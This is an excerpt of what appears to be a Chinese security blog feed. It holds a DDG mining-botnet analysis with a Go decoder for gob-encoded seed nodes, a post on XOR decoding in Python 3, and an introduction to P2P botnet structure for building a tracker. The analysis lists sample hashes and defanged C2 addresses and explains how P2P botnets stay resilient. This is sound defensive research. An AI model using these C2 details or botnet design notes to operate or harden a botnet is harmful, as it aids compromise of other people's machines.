<h2 id="4-完成数据解码"><a href="#4-完成数据解码" class="headerlink" title="4. 完成数据解码"></a>4. 完成数据解码</h2><p>上面我们分析出了编码数据原始的<strong>基础结构定义</strong>，之所以说是<strong>基础</strong>，是因为这个结构定义只代表<strong>单个 Seed Node</strong>，而这些数据是<strong>一批 Seed Node</strong> 的列表。要想写程序完成最终的数据解码，还需要用 Go 的数组或切片把上面的数据结构定义封装一下。最终的数据解码代码关键部分示例如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> SeedNode <span class="keyword">struct</span> &#123;</div><div class="line">	IP   net.IP</div><div class="line">	Port <span class="keyword">int64</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Open the dumped raw data file</span></div><div class="line">fd, fdErr := os.OpenFile(<span class="string">"raw_data.dump"</span>, os.O_RDONLY, <span class="number">0644</span>)</div><div class="line">br := bufio.NewReader(fd)</div><div class="line"></div><div class="line">dec := gob.NewDecoder(br)</div><div class="line"></div><div class="line"><span class="comment">// make Seed Node slice</span></div><div class="line"><span class="keyword">var</span> d []SeedNode</div><div class="line">decErr := dec.Decode(&amp;d)</div><div class="line"></div><div class="line"><span class="keyword">for</span> _, seedNode := <span class="keyword">range</span> d &#123;</div><div class="line">	fmt.Printf(<span class="string">"%s:%d\n"</span>, seedNode.IP, seedNode.Port)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完整代码链接： <a href="https://github.com/0xjiayu/decode_gob_in_ddgs_v4005/blob/master/hubs_dump.go" target="_blank" rel="external">https://github.com/0xjiayu/decode_gob_in_ddgs_v4005/blob/master/hubs_dump.go</a> </p>
<h2 id="5-辅助工具——degob"><a href="#5-辅助工具——degob" class="headerlink" title="5. 辅助工具——degob"></a>5. 辅助工具——degob</h2><p>DDG v4005 的样本中涉及的 gob 数据编码，原始数据结构简单，逆向难度不高。如果遇到结构更复杂的数据经 gob 序列化编码，逆向难度肯定要增加。如果有一款工具可以自动化把任意 gob 序列化后的数据还原，最好不过了。</p>
<p>Google 一番，我找到了一个还算理想的工具，degob，专为逆向分析 gob 编码数据而生： <a href="https://gitlab.com/drosseau/degob" target="_blank" rel="external">https://gitlab.com/drosseau/degob</a> </p>
<p>不过 degob 并不完美，它只能解析出 Go 最底层的数据类型。比如本文中用到的 <code>net.IP</code>，定义为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> IP []<span class="keyword">byte</span></div></pre></td></tr></table></figure>
<p>那么 degob 解析数据的时候，就会把 <code>net.IP</code> 这一个成员表示为 <code>[]byte</code>，至于这个 <code>[]byte</code> 的<strong>高层结构类型</strong>代表什么，还需要结合样本逆向来确认。比如我逆向时发现样本中用 <code>net.IP.String()</code> 函数来解析这个数据成员，那么就可以确定，degob 解析出来的 <code>[]byte</code> ，其实就是 <code>net.IP</code>。degob 解析上述 Raw Data，得出的数据结构定义为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// []Anon65_5e8660ee</span></div><div class="line"></div><div class="line"><span class="comment">// type ID: 65</span></div><div class="line"><span class="keyword">type</span> Anon65_5e8660ee <span class="keyword">struct</span> &#123;</div><div class="line">        IP []<span class="keyword">byte</span></div><div class="line">        Port <span class="keyword">int64</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后就是 degob 解出来的部分数据(不完美解析，需要结合样本逆向才能确认 IP 的真实结构类型)：</p>
<p><img src="/imgs/decrypt_gob/degob_output.png" style="zoom:60%;"></p>
<p>不过，这个 degob 两年没更新了，作者可能也不维护了，在它的 <strong>cmds/degob/main.go</strong> 文件中还有一个 Bug，命令行参数把 <strong>inFile</strong> 误写成了 <strong>outFile</strong> ：</p>
<p><img src="/imgs/decrypt_gob/bug_of_degob.png" alt=""></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>DDG 的恶意样本中还有另外一个序列化数据的解码，即用 <a href="https://msgpack.org/" target="_blank" rel="external">msgPack</a> 编码的云端配置数据。如果要用 msgPack 的 Go 语言 SDK 去解码这个配置文件，需要逆向分析出更复杂的配置数据结构定义(在 <a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(下)</a> 一文中有详细阐述)。不过好在 msgPack 是个通用的序列化编码方案，除了 Go，还支持其他语言，比如 Python。更方便的是，用 msgPack for Python 来对序列化数据进行解码并不需要预先知道数据结构定义即可直接解码，这就大大降低了逆向工作的难度。</p>
<p>然而 gob 序列化只属于 Go 语言自有，并没有其他语言的 SDK，要想逆向解码 gob 序列化编码过的二进制数据数据，就必须分析出原始的数据结构定义。这样来看， gob 序列化数据逆向解码并没有万全之策，即使有 degob 这种工具的加持，也得结合样本逆向分析才能精准解析、还原明文数据。</p>
<p>本文用到的 Go 语言程序、从样本中提取的 gob 编码的原始二进制数据以及样本运行时的 debug 日志，都上传到 Github，感兴趣的师傅自取：</p>
<p> <a href="https://github.com/0xjiayu/decode_gob_in_ddgs_v4005" target="_blank" rel="external">https://github.com/0xjiayu/decode_gob_in_ddgs_v4005</a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;本文首发于安全客，原文链接：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/192948&quot;&gt;https://www.anquanke.com/post/id/192948&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;DDG 是一个 一直活跃的挖矿僵尸网络，其主样本由 Go 语言编写。它最新活跃的版本中用基于 Gossip 协议实现集群管理的第三方库 &lt;strong&gt;&lt;a href=&quot;https://github.com/hashicorp/memberlist&quot;&gt;Memberlist&lt;/a&gt;&lt;/strong&gt; 把整个僵尸网络构建成了一个非典型的 P2P 结构。关于其 P2P 网络结构以及如何基于 P2P 特性追踪该僵尸网络，我在以前的两篇文章中有详细描述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177665&quot;&gt;以P2P的方式追踪 DDG 僵尸网络(上)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177742&quot;&gt;以P2P的方式追踪 DDG 僵尸网络(下)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;11.6 日晚上，我的 DDG 挖矿僵尸网络追踪程序检测到 DDG 家族更新到了版本 4005，IoC 如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MD5:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;64c6692496110c0bdce7be1bc7cffd47  ddgs.i686&lt;/li&gt;
&lt;li&gt;638061d2a06ebdfc82a189cf027d8136  ddgs.x86_64 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;CC&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;67.207.95[.]103:8000&lt;/li&gt;
&lt;li&gt;103.219.112[.]66:8000 &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;经过简单的分析，新版恶意样本的关键行为与旧版本差异不大，以前部署的追踪程序依然能持续追踪。不过其中一个小的技术点引起了我的注意。&lt;/p&gt;
&lt;p&gt;以前说过，DDG 样本为了通过 Memberlist 库加入 P2P 网络(函数 &lt;code&gt;Memberlist.join()&lt;/code&gt;)，需要一批初始的 P2P Nodes ，新的样本代表的 P2P 节点会通过这些初始的 P2P Nodes 加入 P2P 网络。在旧版样本中，这些初始的 P2P Nodes 被称为 &lt;strong&gt;Hub List&lt;/strong&gt;，其中约有 200 个 节点 IP 地址，这一份 IP 列表以 Hex 数组形式硬编码保存在样本中。而新版 DDG 样本中则把这些 P2P Nodes 称为 &lt;strong&gt;Seeds&lt;/strong&gt;(Memberlist 库 &lt;code&gt;Join()&lt;/code&gt; 函数的 ”种子“)，这些 Seeds 用 &lt;a href=&quot;https://blog.golang.org/gobs-of-data&quot;&gt;Golang gob&lt;/a&gt; 序列化编码后再硬编码保存在样本中，样本里还用一组 &lt;code&gt;ddgs_network__mlUtils_*&lt;/code&gt; 函数来处理这些 Seeds：&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="ddg" scheme="http://jiayu0x.com/tags/ddg/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="gob" scheme="http://jiayu0x.com/tags/gob/"/>
    
      <category term="decode" scheme="http://jiayu0x.com/tags/decode/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Python3 中对二进制数据 XOR 编码的正确姿势</title>
    <link href="http://jiayu0x.com/2019/05/26/The_right_way_to_xor_encoding_with_python3/"/>
    <id>http://jiayu0x.com/2019/05/26/The_right_way_to_xor_encoding_with_python3/</id>
    <published>2019-05-25T16:00:00.000Z</published>
    <updated>2019-05-26T15:00:55.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>Python3 中的默认编码是 UTF-8，这给大家写 Python 代码带来了很大的便利，不用再像 Python2.x 那样为数据编码操碎了心。但是，由于全面转向 UTF-8 编码，Python3 里面会有一些小细节，稍有不慎容易栽坑。本文就对二进制数据 XOR 编码这一种操作，浅析 Py2/Py3 中默认编码相关的一个细节小差异而引起的小 Bug。</p>
</blockquote>
<p>XOR 编码是最简单有效的编码方法之一，虽然简单，但仍然应用广泛。在分析恶意样本时，经常会遇到样本内置的隐秘数据或者网络通信数据，用到了 XOR 编码。比如，一个典型就是 XOR.DDoS 家族，它样本内部关键字符串全用 XOR 编码过，而且其网络通信中 Bot 发给 C2 的上线数据包和 C2 给 Bot 下发的控制指令数据包中均涉及 XOR 编码/解码操作。</p>
<a id="more"></a>
<p>对于这类样本，分析的时候我们不免要写一些自动化的解析脚本，把其中的编码数据还原成名文以便分析。在其他开发场景中也偶尔会用 Python 写一些 XOR 编码/解码的程序。网上一搜 「Python XOR 编码 加密」或者「Python XOR encoding crypt」，都会搜出很多别人发出来的 Python XOR 编解码脚本，大多数情况下拿来直接用就行。比如我搜来的几个中文帖子中的相关脚本（本人不保证下面截图里代码的正确性）：</p>
<p><img src="/imgs/py2_xorfunc_1.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_2.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_3.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_4.png" alt=""></p>
<p>这些脚本，在 Python2 环境下都没有问题，都可以正确进行 XOR 编解码，然而如果直接拿到 Python3 环境下去运行，却会发生一个不容易发现的小 Bug。来看一段在 ipthon3 里的操作记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">In [1]: def xor_crypt(data, key):</div><div class="line">   ...:     cipher_data = []</div><div class="line">   ...:     len_data = len(data)</div><div class="line">   ...:     len_key = len(key)</div><div class="line">   ...:     for idx in range(len_data):</div><div class="line">   ...:         bias = key[idx % len_key]</div><div class="line">   ...:         curr_byte = data[idx]</div><div class="line">   ...:         cipher_data.append(chr(bias ^ curr_byte))</div><div class="line">   ...:     return bytearray(&quot;&quot;.join(cipher_data).encode())</div><div class="line">   ...:</div><div class="line"></div><div class="line">In [2]: xor_key = b&apos;0123456789&apos;</div><div class="line"></div><div class="line">In [3]: sam1 = b&apos;abcdefgh&apos;</div><div class="line"></div><div class="line">In [4]: sam2 = b&apos;abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line"></div><div class="line">In [5]: print(xor_crypt(sam1,xor_key))</div><div class="line">bytearray(b&apos;QSQWQSQ_&apos;)</div><div class="line"></div><div class="line">In [6]: print(xor_crypt(xor_crypt(sam1,xor_key), xor_key))</div><div class="line">bytearray(b&apos;abcdefgh&apos;)</div><div class="line"></div><div class="line">In [7]: print(xor_crypt(sam2, xor_key))</div><div class="line">bytearray(b&apos;QSQWQSQ_QS[]_][EGEKMEGEKMO&apos;)</div><div class="line"></div><div class="line">In [8]: print(xor_crypt(xor_crypt(sam2,xor_key), xor_key))</div><div class="line">bytearray(b&apos;abcdefghijklmnopqrstuvwxyz&apos;)</div><div class="line"></div><div class="line">In [9]: sam3 = b&apos;\x7f\x80\x81\x90\x91\xA0\xA1\xB0\xB1\xC0\xC1\xD0\xD1\xE0\xE1\xF0\xF1\xFA&apos;</div><div class="line"></div><div class="line">In [10]: print(xor_crypt(sam3, xor_key))</div><div class="line">bytearray(b&apos;O\xc2\xb1\xc2\xb3\xc2\xa3\xc2\xa5\xc2\x95\xc2\x97\xc2\x87\xc2\x89\xc3\xb9\xc3\xb1\xc3\xa1\xc3\xa3\xc3\x93\xc3\x95\xc3\x85\xc3\x87\xc3\x8d&apos;)</div><div class="line"></div><div class="line">In [11]: print(xor_crypt(xor_crypt(sam3,xor_key), xor_key))</div><div class="line">bytearray(b&apos;\x7f\xc3\xb3\xc2\x83\xc3\xb1\xc2\x87\xc3\xb7\xc2\x95\xc3\xb5\xc2\x9d\xc3\xbb\xc2\xa5\xc3\xb3\xc2\xa5\xc3\xb1\xc2\xb3\xc3\xb7\xc2\xbf\xc3\xb4\xc2\x81\xc3\xba\xc2\x81\xc3\xb2\xc2\x93\xc3\xb0\xc2\x97\xc3\xb6\xc2\xa5\xc3\xb4\xc2\xad\xc3\xba\xc2\xb5\xc3\xb2\xc2\xb5\xc3\xb0\xc2\xb9&apos;)</div><div class="line"></div><div class="line">In [12]: print(len(sam3))</div><div class="line">18</div><div class="line"></div><div class="line">In [13]: print(len(xor_crypt(xor_crypt(sam3,xor_key), xor_key)))</div><div class="line">69</div></pre></td></tr></table></figure>
<p>可以看到，仿照 Python2 环境下那些常用的 XOR 编码操作写的函数，在 Python3 环境下，偶尔会出现意料之外的结果：上面的操作记录中，对于 <strong>sam1</strong> 和 <strong>sam2</strong> 两个全都是可打印字符的字节串进行 XOR 编解码是没有问题的；但是对于 <strong>sam3</strong> ，一个内含大量 HEX 值大于 <strong>0x7F</strong> 的非可打印字符字节串，原本是 18 个字节，进行两次 XOR 操作之后竟然变成了 69 个字节。</p>
<p>这就十分蹊跷了。问题出在哪个环节？是函数内部的字节列表 <strong>cipher_data</strong> 的问题，还是最后 <strong>bytearray()</strong> 操作出了问题，还是进行 XOR 计算的时候，<strong>chr()</strong> 函数的问题？</p>
<p>经过一番排查，发现这是 <strong>chr()</strong> 函数的问题。先看这个函数在 Python2 和 Python3 中各有什么表现：</p>
<p><img src="/imgs/python3_sample.png" alt=""></p>
<p><img src="/imgs/python2_sample.png" alt=""></p>
<p>在 Python2 版本中，除了 <strong>chr()</strong> 还有一个 <strong>unichr()</strong> ，可以看到 Py2 中的 <strong>unichr()</strong> 与Py3 中的 <strong>chr()</strong> 行为是一致的：对于 HEX 值大于 0x7F 的字符，返回值占 2 Bytes；对于 HEX 值小于或等于 0x7F 的字符，返回值占 1 Byte。</p>
<p>为什么会出现这么个差异？刚开始一直以为 <strong>chr()</strong> 函数只会返回 1 Byte 的结果，对此感到很是不解。</p>
<p>查阅一下 Py2 中 <strong>chr()</strong> 和 <strong>unichr()</strong> 的文档如下：</p>
<p><img src="/imgs/py2_chr_doc.png" alt=""></p>
<p><img src="/imgs/py2_unichr_doc.png" alt=""></p>
<p>而 Py3 中 <strong>chr()</strong> 函数的文档说明如下：</p>
<p><img src="/imgs/py3_chr_doc.png" alt=""></p>
<p>从文档来看， Py3 中的 <strong>chr()</strong> 函数确实对应到了 Py2 中的 <strong>unichr()</strong> 函数，只返回 Unicode 编码的结果。在点破最后的一层窗户纸之前，我们再去 CPython 的源码里瞅一眼，以便把这个结论锤结实了。</p>
<p>Py3 中的 <strong>chr()</strong> 函数，源码中是这样实现的：</p>
<p><img src="/imgs/cpython_bltinmodule_pyobject_chr.png" alt=""></p>
<p><img src="/imgs/cpython_builtin_chr_impl.png" alt=""></p>
<p><img src="/imgs/cpython_objects_PyUnicode_FromOrdinal.png" alt=""></p>
<p>至于其中的 <strong>unicode_char()</strong> 函数如何实现，我们就不深究了，知道它就是返回一个 Unicode 编码的字符即可。再看 Py2 中 <strong>unichr()</strong> 函数：</p>
<p><img src="/imgs/cpython_27_unichr.png" alt="">   </p>
<p>如出一辙有木有。</p>
<p>那<strong>最后一层窗户纸</strong>到底是什么？就是 Py3 默认的 UTF-8 编码了。在  <a href="http://www.utf-8.com" target="_blank" rel="external">http://www.utf-8.com</a> 网站上有这么一段话：</p>
<blockquote>
<p>UTF-8 encodes each Unicode character as a <strong>variable number of 1 to 4 octets</strong>, where the number of octets depends on the integer value assigned to the Unicode character. It is an efficient encoding of Unicode documents that use mostly US-ASCII characters because <strong>it represents each character in the range U+0000 through U+007F as a single octet</strong>.</p>
</blockquote>
<p>注意上面加粗部分的重点：</p>
<ol>
<li>UTF-8 编码的字符占 1~4 个字节；</li>
<li>字符 U+0000 到 U+007F 都用一个字节来表示，其它字符 1 个字节不够，就用 2~4 个字节来表示。</li>
</ol>
<p>这样就明确上面问题的原因了：Py3 中的 <strong>chr()</strong> 函数，只有在参数的 HEX 值位于 [0x00, 0x7F] 区间内的时候才返回 1 Byte 的结果，这个结果同于 Py2 中的 <strong>chr()</strong> 函数；当 HEX 值大于 0x7F ，其返回值占 2 Bytes，行为同于 Py2 中的 <strong>unichr()</strong> 函数。</p>
<p>那么 Py3 中正确的 XOR 编解码姿势是什么？上面 ipython3 操作记录中的函数稍加改动即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span><span class="params">(data, key)</span>:</span></div><div class="line">    cipher_data = []</div><div class="line">    len_data = len(data)</div><div class="line">    len_key = len(key)</div><div class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(len_data):</div><div class="line">        bias = key[idx % len_key]</div><div class="line">        curr_byte = data[idx]</div><div class="line">        cipher_data.append(bias ^ curr_byte)</div><div class="line">    <span class="keyword">return</span> bytearray(cipher_data)</div></pre></td></tr></table></figure>
<p>当然，还有更简洁的写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">XORCrypt</span><span class="params">(data, key)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(a^b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(*map(bytearray, [data, key])))</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Python3 中的默认编码是 UTF-8，这给大家写 Python 代码带来了很大的便利，不用再像 Python2.x 那样为数据编码操碎了心。但是，由于全面转向 UTF-8 编码，Python3 里面会有一些小细节，稍有不慎容易栽坑。本文就对二进制数据 XOR 编码这一种操作，浅析 Py2/Py3 中默认编码相关的一个细节小差异而引起的小 Bug。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XOR 编码是最简单有效的编码方法之一，虽然简单，但仍然应用广泛。在分析恶意样本时，经常会遇到样本内置的隐秘数据或者网络通信数据，用到了 XOR 编码。比如，一个典型就是 XOR.DDoS 家族，它样本内部关键字符串全用 XOR 编码过，而且其网络通信中 Bot 发给 C2 的上线数据包和 C2 给 Bot 下发的控制指令数据包中均涉及 XOR 编码/解码操作。&lt;/p&gt;
    
    </summary>
    
      <category term="dev" scheme="http://jiayu0x.com/categories/dev/"/>
    
    
      <category term="dev" scheme="http://jiayu0x.com/tags/dev/"/>
    
      <category term="python" scheme="http://jiayu0x.com/tags/python/"/>
    
      <category term="xor" scheme="http://jiayu0x.com/tags/xor/"/>
    
  </entry>
  
  <entry>
    <title>以 P2P 的方式追踪 DDG 僵尸网络</title>
    <link href="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/"/>
    <id>http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/</id>
    <published>2019-04-10T16:00:00.000Z</published>
    <updated>2019-05-11T06:35:23.036Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序<br> <strong>文章分为三部分</strong>：</p>
<ol>
<li>Botnet 简介</li>
<li>DDG.Mining.Botnet 介绍，着重介绍其涉及的 P2P 特性；</li>
<li>根据 DDG.Mining.Botnet 的 P2P 特性，设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，来遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时获知 Botnet 中最新启用的 C&amp;C 服务器。</li>
</ol>
</blockquote>
<p>文章首发于安全客，原文链接：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/177665" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（上）</a></li>
<li><a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（下）</a></li>
</ol>
<a id="more"></a>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><h3 id="1-1-Botnet-及其网络结构"><a href="#1-1-Botnet-及其网络结构" class="headerlink" title="1.1 Botnet 及其网络结构"></a>1.1 Botnet 及其网络结构</h3><h4 id="1-1-1-Botnet-简介"><a href="#1-1-1-Botnet-简介" class="headerlink" title="1.1.1 Botnet 简介"></a>1.1.1 Botnet 简介</h4><p><strong>Botnet(僵尸网络)</strong>没有一个准确的定义，关于什么是 Botnet，众说纷纭，总结起来不外乎两大特性：</p>
<ol>
<li>众多被入侵的僵尸主机，上面运行着相同的 Botnet 客户端恶意程序，这些众多的僵尸主机组成一个大型的“网络”(顾名思义被称作<strong>僵尸网络</strong>)，可以进行统一的恶意活动——<strong>主要特性</strong>；</li>
<li>僵尸网络实施的统一的恶意活动，由 C&amp;C(Command and Control)服务来控制，一般说来，是可以长时间持续控制——<strong>次要特性</strong>。</li>
</ol>
<p>Botnet 常见的恶意活动有实施 DDoS 攻击、用来做 Proxy Server 或者发送垃圾邮件等等。一个典型 DDoS Botnet 的大致结构如下图所示：</p>
<p><img src="/imgs/ddos_botnet.png" style="zoom:40%"></p>
<h4 id="1-1-2-传统-Botnet"><a href="#1-1-2-传统-Botnet" class="headerlink" title="1.1.2 传统 Botnet"></a>1.1.2 传统 Botnet</h4><p>传统的 Botnet，一般指<strong>可以通过少数特定C&amp;C服务器来集中式控制的僵尸网络</strong>，用来给僵尸主机上的 Botnet 客户端恶意程序下发指令的服务器，叫做 <strong>C&amp;C 服务器</strong>(Command and Control Server)。其网络模型基于 Client-Server 模型，属于<strong>中心化控制(Centralized Control)</strong>方式。其概要结构图如下(中间的图标代表 C&amp;C 服务器)：</p>
<p><img src="/imgs/traditional_botnet_structure.png" style="zoom:40%"></p>
<p>这种网络结构只有一个或者少数几个 C&amp;C 服务器，一旦 C&amp;C 服务器被封堵、屏蔽，整个 Botnet 就轰然倒塌，脆弱性是显而易见的。所以，这种网络结构的 Botnet 发展历程中，从样本层面到网络设施层面都衍生了错综复杂的对抗措施，二进制样本层面的对抗之外，从 DGA 到 Fast-Flux，到借助于公共网络服务的 C&amp;C 通道，再到近两年基于区块链的域名解析，最终目的都是提高这种 Botnet 背后 C&amp;C 服务的健壮性，以降低被轻易摧毁的可能性。</p>
<h4 id="1-1-3-P2P-Botnet"><a href="#1-1-3-P2P-Botnet" class="headerlink" title="1.1.3 P2P Botnet"></a>1.1.3 P2P Botnet</h4><p>为了避免传统 Botnet 中的 <strong>单点故障</strong> 现象，也不想使用太复杂的技术来提高个别 C&amp;C 服务的健壮性，去中心化的 P2P Botnet 应运而生。基于 P2P 协议实现的 Botnet，不再需要中心化的 C&amp;C 服务器，只靠 Bot 节点之间各自通信，传播指令或者恶意文件。而 Botnet 的控制者(BotMaster)就隐藏在大批量的 Bot 节点中，悄悄控制着整个 Botnet。</p>
<p>这样以来至少有两个显而易见的好处：一方面消除了传统 Botnet 中的中心化控制带来的单点故障因素，另一方面还让 BotMaster 更加隐蔽。</p>
<p>关于 P2P Botnet，有 3 个方面要阐述清楚，才能更好地理解这种 Botnet。</p>
<p><strong>一</strong>是所使用的 <strong>P2P 协议</strong>。P2P 协议有很多种，并且不止一种 P2P 协议可以用来组建 P2P Botnet。目前最常见的 P2P 协议莫过于基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 实现的 P2P 协议，用来构建 P2P 文件共享网络的 BitTorrent 协议，也是基于 DHT 协议实现。</p>
<p><strong>二</strong>是 Botnet 的<strong>控制方式</strong>。前面说过 P2P Botnet 中，BotMaster 控制着其中一个 Bot 节点（后文简称 <strong>SBot</strong> ），隐藏在大批量的 Bot 节点中，通过 SBot 节点，向整个 Botnet 发出控制指令或者更新恶意文件。根据 P2P 协议特性，理论上任何人都可以加入这个网络并与其他节点通信。整个过程中，BotMaster 必须保证只有他自己可以发送有效的控制指令或文件，其他节点可以进行常规通信(遍历节点、查询临近节点信息、接收指令或文件等等)，但不能发送控制指令或文件。其他节点发出的指令或文件，整个网络中的 Bot 节点都不会接受。</p>
<p>要实现这样的特性，BotMaster 必须给这些关键通信加上校验机制。比如利用非对称加密算法，通过只有 BotMaster 一人掌握的密钥给通信内容加上数字签名。接收到指令或文件的 Bot 节点，会用自己的另一个密钥来校验数据的合法性，合法的通信才接受，非法的则丢弃。</p>
<p><strong>三</strong>是 P2P Botnet 的<strong>网络结构</strong>。P2P Botnet 的结构，就是典型的 P2P 网络结构，如图所示：</p>
<p><img src="/imgs/p2p_botnet_structure.png" style="zoom:50%"></p>
<p>这其实是一个简化的网络模型，考虑到 NAT 的存在，这种模型图并不能精准描述 P2P Botnet 的网络结构。对此， <a href="https://twitter.com/MalwareTechBlog" target="_blank" rel="external">@MalwareTechBlog</a> 在 <a href="https://www.malwaretech.com/2013/12/peer-to-peer-botnets-for-beginners.html" target="_blank" rel="external">Peer-to-Peer Botnets for Beginners</a> 中有详细描述，他给出的 P2P Botnet 网络结构图如下：</p>
<p><img src="/imgs/nodes.png" alt=""></p>
<h4 id="1-1-4-挖矿僵尸网络"><a href="#1-1-4-挖矿僵尸网络" class="headerlink" title="1.1.4 挖矿僵尸网络"></a>1.1.4 挖矿僵尸网络</h4><p>文章开头说了 Botnet 的两大特性，第二条算是<strong>次要特性</strong>，这样说的理由，配合挖矿僵尸网络(Mining Botnet)来解释更容易理解。</p>
<p>一般说来，无论是传统 Botnet  还是 P2P Botnet，都有一个 C&amp;C 服务来持续控制它，比如控制它今天 DDoS 一个网站，明天给某个帖子刷量，后天又去发一波垃圾邮件……但近些年来，随着挖矿僵尸网络的盛行，由于盈利模式的简单粗暴，致使 Botnet 的网络结构也发生了细微的变化：<strong>挖矿僵尸网络可以不再需要一个持续控制的 C&amp;C 服务</strong>。</p>
<p>对于<strong>纯粹的</strong>挖矿僵尸网络，它的恶意活动是单一而且确定的：<strong>挖矿</strong>，所以可以不再需要一个 C&amp;C 服务来给它下发指令来实施恶意活动；它的恶意活动是持续进行的，不间断也不用切换任务，所以也不需要一个 C&amp;C 服务来<strong>持续控制</strong>。挖矿僵尸网络要做的事情，从在受害主机上植入恶意矿机程序开始，就可以放任不管了。甚至 BotMaster 都不需要做一个 Report 服务来统计都有哪些僵尸节点来给自己挖矿，自己只需要不断地<strong>入侵主机–&gt;植入矿机–&gt;启动矿机程序挖矿</strong>，然后坐等收益即可。</p>
